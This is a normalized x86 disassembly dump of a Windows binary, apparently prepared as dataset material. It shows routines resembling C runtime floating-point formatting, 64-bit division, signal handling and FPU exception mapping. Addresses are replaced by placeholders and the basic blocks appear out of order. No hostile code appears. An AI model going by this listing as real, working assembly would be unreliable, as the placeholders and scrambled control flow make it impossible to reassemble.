cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_41dfc8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41c653
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_41e04a
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_41e066
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_421856
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_4217ae
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_41e0c2
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_418e20
inc eax
push eax
push esi
add esi edi
push esi
call sub_414a50
add esp 0x10
sub_41e107
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_41c653
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebp + 0x8 ] esi
jbe r-xdata
call sub_4162ac
push 0x16
cmp [ ebp + 0xc ] esi
jle r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x18 ] 0x0
je r-xdata
call sub_4162ac
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] esi
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_41e0c2
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_4153b1
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
lea eax [ esi + 0x1 ]
mov cl [ eax ]
mov [ esi ] cl
mov esi eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_415289
add esp 0x14
push r--data
push ebx
push esi
call sub_418db8
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
inc esi
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
inc esi
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi ] 0x2d
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_414a50
add esp 0xc
inc esi
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi ] al
mov eax edx
add [ esi + 0x1 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi ] al
mov eax edx
sub_41e276
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_421a7a
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_4162ac
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_4153b1
add esp 0x14
mov eax esi
jmp r-xdata
mov esi [ ebp + 0x14 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_414a33
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
cmp esi ebx
setg cl
sub eax ecx
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push ebx
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_41e107
add esp 0x18
mov [ edi ] bl
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
cmp esi ebx
setg cl
add eax edi
add ecx eax
push ecx
call sub_4218fe
add esp 0x10
cmp eax ebx
je r-xdata
sub_41e346
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41e276
add esp 0x18
pop ebp
retn
sub_41e366
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_41c653
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_4162ac
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_4162ac
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_4153b1
add esp 0x14
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
mov [ esi ] 0x30
inc esi
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
mov ecx [ edi + 0x4 ]
inc esi
neg ebx
sbb ebx ebx
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi ] 0x31
inc esi
mov [ esi ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
inc esi
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_41e346
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
mov [ esi ] 0x30
inc esi
cmp [ ebp + 0x18 ] 0x0
push 0x65
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
inc esi
push esi
call sub_421640
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_421bf0
add ax 0x30
movzx eax ax
cmp ax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_421bf0
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_415f60
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
inc esi
call sub_421bf0
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi ] 0x2d
inc esi
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi ] 0x2b
inc esi
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_421b10
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
cmp edx ebx
mov edi esi
mov [ esi ] 0x30
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_421b10
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_421b10
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_41e6d9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov ebx eax
mov esi [ ebx + 0x4 ]
mov edi ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_41c653
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_4162ac
push 0x16
pop esi
mov [ eax ] esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_4153b1
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebx ] 0x2d
mov esi edi
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0x4 ]
xor edi edi
inc edi
test eax eax
jg r-xdata
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
xor eax eax
cmp [ ebx ] 0x2d
sete al
add eax esi
add eax edi
mov [ eax ] 0x30
mov [ eax + 0x1 ] 0x0
add esi eax
mov eax esi
call sub_41e0c2
mov [ esi ] 0x30
inc esi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
call sub_41e0c2
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov ebx [ ebx + 0x4 ]
inc esi
test ebx ebx
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg ebx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] ebx
cmp [ ebp + 0xc ] ebx
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax esi
call sub_41e0c2
push edi
push 0x30
push esi
call sub_415f60
add esp 0xc
sub_41e7d0
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_421a7a
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_4162ac
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_4153b1
add esp 0x14
mov eax esi
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_414a33
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push ebx
push esi
push [ ebp + 0x10 ]
mov ecx edi
call sub_41e6d9
add esp 0x10
mov [ edi ] bl
jmp r-xdata
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_4218fe
add esp 0x10
cmp eax ebx
je r-xdata
sub_41e88b
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_421a7a
xor ebx ebx
add esp 0x14
cmp esi ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx ebx
jbe r-xdata
call sub_4162ac
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] edi
call sub_4153b1
add esp 0x14
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x30 ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_414a33
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
cmp [ ebp - 0x20 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_4218fe
add esp 0x10
cmp eax ebx
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_41e107
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
cmp cl bl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_41e6d9
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] bl
sub_41e985
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41e276
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41e7d0
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41e366
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41e88b
jmp r-xdata
sub_41ea0d
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41e985
add esp 0x1c
pop ebp
retn
sub_41ea30
mov edi edi
push esi
push edi
xor edi edi
lea esi [ edi + rw-data ]
push [ esi ]
call sub_419d71
add edi 0x4
pop ecx
mov [ esi ] eax
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_41ea51
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_421c18
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_415289
add esp 0x14
sub_41ea7c
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ r--data ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fdiv [ ebp - 0x10 ]
fmul [ ebp - 0x10 ]
fsubr [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fld1
fcomp [ ebp - 0x8 ]
fnstsw ax
test ah 0x5
jpe r-xdata
xor eax eax
leave
retn
xor eax eax
inc eax
leave
retn
sub_41eaba
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp sub_41ea7c
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push 0x0
call eax
retn
sub_41eb01
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_41eb45
push 0x20
push r--data
call sub_415ff4
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_419ffc
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_416039
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_41eb01
mov esi eax
add esi 0x8
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_418519
mov [ ebp - 0x1c ] 0x1
push eax
call sub_419dec
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_4162ac
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_4153b1
add esp 0x14
jmp r-xdata
mov [ ebp - 0x20 ] eax
pop ecx
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_419057
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_419de3
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41ecb9
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
add ecx edx
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_41ed13
push 0x10
push r--data
call sub_415ff4
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_416039
retn
sub_41ed80
push ebx
push edi
xor edi edi
mov eax [ esp + 0x10 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x18 ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0xc ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x10 ] eax
mov [ esp + 0xc ] edx
or eax eax
jne r-xdata
mov edx [ esp + 0x14 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x18 ] eax
mov [ esp + 0x14 ] edx
mov ebx eax
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov eax [ esp + 0xc ]
div ecx
mov eax edx
xor edx edx
dec edi
jns r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov ecx eax
mul [ esp + 0x18 ]
xchg ecx eax
mul [ esp + 0x14 ]
add edx ecx
jb r-xdata
neg edx
neg eax
sbb edx 0x0
jmp r-xdata
sub eax [ esp + 0x14 ]
sbb edx [ esp + 0x18 ]
cmp edx [ esp + 0x10 ]
ja r-xdata
pop edi
pop ebx
retn 0x10
jb r-xdata
sub eax [ esp + 0xc ]
sbb edx [ esp + 0x10 ]
dec edi
jns r-xdata
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_41ee35
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cl [ ebp + 0x10 ]
push ebx
push esi
push edi
xor edi edi
mov [ eax + 0x4 ] edi
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ eax + 0x8 ] edi
mov eax [ ebp + 0x8 ]
inc ebx
mov [ eax + 0xc ] edi
test cl 0x10
je r-xdata
test cl 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] ebx
mov [ ebp + 0x10 ] 0xc000008f
test bl cl
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x2
mov [ ebp + 0x10 ] 0xc0000093
test cl 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x4
mov [ ebp + 0x10 ] 0xc0000091
test cl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x8
mov [ ebp + 0x10 ] 0xc000008e
mov esi [ ebp + 0xc ]
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shl ecx 0x4
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x10
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
add ecx ecx
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x8
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x1
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x4
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x3
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x2
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x5
not ecx
xor ecx [ eax + 0x8 ]
and ecx ebx
xor [ eax + 0x8 ] ecx
call sub_41f68e
test bl al
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x10
mov [ ebp + 0x10 ] 0xc0000090
test al 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x10
test al 0x8
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x8
test al 0x10
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x4
test al 0x20
je r-xdata
